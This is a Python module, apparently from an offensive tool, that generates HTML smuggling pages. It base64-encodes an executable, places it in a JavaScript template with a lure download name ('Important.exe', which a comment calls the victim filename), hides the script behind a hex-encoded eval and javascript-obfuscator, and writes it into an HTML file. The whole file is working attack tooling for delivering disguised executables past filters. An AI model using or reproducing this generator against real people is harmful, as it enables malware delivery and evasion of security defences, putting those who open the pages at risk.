from . import logging
import os, sys, shutil, subprocess, base64
import tempfile
from jsmin import jsmin



def check_template_files(html_template_path, js_template_path):
    """
    Verifies that the required template files exist in the template directory.

    :param template_dir: The directory containing the template files.
    """

    if not os.path.isfile(js_template_path):
        logging.error(
            f"[bold red]Javascript template file '{js_template_path}' not found.[/]",
            extra={"markup": True},
        )
        sys.exit(1)

    if not os.path.isfile(html_template_path):
        logging.error(
            f"[bold red]HTML template file '{html_template_path}' not found.[/]",
            extra={"markup": True},
        )
        sys.exit(1)


class JavaScriptObfuscator:
    def __init__(self):
        self.obfuscator_path = self._find_obfuscator()

    def _find_obfuscator(self):
        obfuscator_path = shutil.which("javascript-obfuscator")
        if not obfuscator_path:
            raise FileNotFoundError("javascript-obfuscator not found in system PATH.")
        return obfuscator_path

    @staticmethod
    def _convert_to_hex_encoded_eval(code):
        return "window['\\x65\x76\\x61\\x6C']('{}')".format(
            "".join("\\x{:02x}".format(ord(c)) for c in code)
        )

    def obfuscate(self, code):
        try:
            # Step 1: Convert the JS code to hex-encoded eval
            hex_encoded_code = self._convert_to_hex_encoded_eval(code)

            # Step 2: Create a temporary JavaScript file with the code
            with tempfile.NamedTemporaryFile(suffix=".js", delete=False) as temp_file:
                temp_file_path = temp_file.name
                temp_file.write(hex_encoded_code.encode("utf-8"))

            output_path = temp_file_path.replace(".js", "_obfuscated.js")

            try:
                # Step 3: Obfuscate the JavaScript code using the external tool
                subprocess.run(
                    [
                        self.obfuscator_path,
                        os.path.abspath(temp_file_path),
                        "--output",
                        os.path.abspath(output_path),
                    ],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    check=True,
                )

                # Step 4: Read the obfuscated code from the output file
                with open(output_path, "r") as output_file:
                    obfuscated_code = output_file.read()

                return obfuscated_code

            except subprocess.CalledProcessError as e:
                logging.error(
                    f"[bold red]Obfuscation process failed: {e.stderr}[/]",
                    extra={"markup": True},
                )
                return None
            except Exception as e:
                logging.error(
                    f"[bold red]Unexpected error during obfuscation: {e}[/]",
                    extra={"markup": True},
                )
                return None
            finally:
                # Clean up temporary files
                self._cleanup_files(temp_file_path, output_path)

        except FileNotFoundError as fnfe:
            logging.error(f"[bold red]{fnfe}[/]", extra={"markup": True})
            return None
        except Exception as e:
            logging.error(
                f"[bold red]Unexpected error: {e}[/]", extra={"markup": True}
            )
            return None

    @staticmethod
    def _cleanup_files(temp_file_path, output_path):
        if os.path.exists(temp_file_path):
            os.remove(temp_file_path)
        if os.path.exists(output_path):
            os.remove(output_path)


def generate_html_payload(
    template_directory,
    executable_path,
    html_template_path,
    js_template_path,
    output_filename,
    download_as_filename="Important.exe",
):
    # Check if the template directory exists
    if not os.path.exists(template_directory):
        logging.error(
            f"[bold red]Template directory '{template_directory}' not found.[/]",
            extra={"markup": True},
        )
        sys.exit(1)

    # Ensure the necessary template files exist
    check_template_files(html_template_path, js_template_path)

    try:
        # Read the binary data from the executable file
        with open(executable_path, "rb") as exe_file:
            binary_data = exe_file.read()
    except FileNotFoundError:
        logging.error(
            f"[bold red]Executable file '{executable_path}' not found.[/]",
            extra={"markup": True},
        )
        sys.exit(1)
    except Exception as e:
        logging.error(
            f"[bold red]Error reading '{executable_path}': {e}[/]",
            extra={"markup": True},
        )
        sys.exit(1)

    # Base64 encode the binary data
    encoded_data = base64.b64encode(binary_data).decode("utf-8")

    try:
        # Read the HTML and JS templates
        with open(html_template_path, "r") as html_template_file:
            html_template_content = html_template_file.read()
        with open(js_template_path, "r") as js_template_file:
            js_template_content = js_template_file.read()
    except FileNotFoundError as e:
        logging.error(
            f"[bold red]Template file '{e.filename}' not found.[/]",
            extra={"markup": True},
        )
        sys.exit(1)
    except Exception as e:
        logging.error(
            f"[bold red]Error reading template file: {e}[/]", extra={"markup": True}
        )
        sys.exit(1)

    # Replace placeholders in the template with the encoded data and the victim filename
    js_content = js_template_content.replace("{encoded_data}", encoded_data)
    js_content = js_content.replace("{filename}", download_as_filename)

    # Obfuscate the JavaScript content
    minified_js_content = jsmin(js_content)
    obfuscator = JavaScriptObfuscator()
    obfuscated_js_content = obfuscator.obfuscate(minified_js_content)

    html_content = html_template_content.replace(
        "{JAVASCRIPT_CONTENT_GOES_HERE}", obfuscated_js_content
    )

    try:
        # Write the modified HTML content to the output file
        with open(output_filename, "w") as output_file:
            output_file.write(html_content)
    except Exception as e:
        logging.error(
            f"[bold red]Error writing to '{output_filename}': {e}[/]",
            extra={"markup": True},
        )
        sys.exit(1)

    logging.info(f"[yellow]HTML file '{str(os.path.basename(output_filename))}' generated successfully.[/]", extra={"markup": True})
